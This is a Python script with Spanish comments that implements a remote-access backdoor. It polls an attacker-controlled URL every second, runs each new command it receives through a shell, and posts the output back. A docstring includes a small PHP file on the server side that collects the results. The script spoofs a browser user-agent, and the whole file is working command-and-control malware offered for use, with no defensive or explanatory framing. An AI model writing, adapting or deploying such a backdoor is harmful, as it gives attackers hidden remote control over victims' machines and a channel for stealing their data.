import requests
import time
import subprocess
import random

# Abrir servidor local: python3 -m http.server 8080

""" Esto va en un archivo llamado cmd.php

<?php
$cmd = htmlspecialchars($_POST['cmd']);
file_put_contents('capture.txt', serialize($cmd));
?>

"""

def limpio(cl):

    cl=cl.replace(" ","[ESP]")
    cl=cl.replace("\n","[SAL]")

    return cl


pasado="" # Primera instancia del programa. No borrar o se cae


headers={

    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/123.0.6312.120 Safari/537.36',
    'Cache-Control': 'no-cache'
}


while True:

    time.sleep(1)
    try:
        get_command=requests.get("URL_FUNcmd.txt", headers=headers)  # Obtiene el comando a ejecutar desde el servidor remoto
    except:
        pass
    else:

        nuevo=get_command.text
        if nuevo != "" and nuevo != pasado: # Verifica que el comando no se ejecute cada vez que este dentro del While

            try:
                pasado=nuevo
                salida=subprocess.check_output(nuevo, shell=True) # Ejecuta el comando y lo transforma a string
                salida=str(salida)
            except:
                data={
                    
                    "cmd":"[ERROR][ESP]COMANDO[ESP]NO[ESP]ENCONTRADO[ESP][CODE:[ESP]{}]".format(random.randint(1,999))           # LINEA NUEVA VERIFICAR MAÑANA

                }

                post_command=requests.post("URL_FUNcmd.php", headers=headers, data=data)
                pass
            else:
                post_cmd=limpio(salida) # Transforma el resultado para ser enviado por solicitud post
                data={
                    
                    "cmd":"{}".format(post_cmd)

                }

                post_command=requests.post("URL_FUNcmd.php", headers=headers, data=data) # Envia el resultado por solicitud post
                #print(limpio(salida))
        else:
            pass # Si no cumple con los requisitos avanza al siguiente bucle
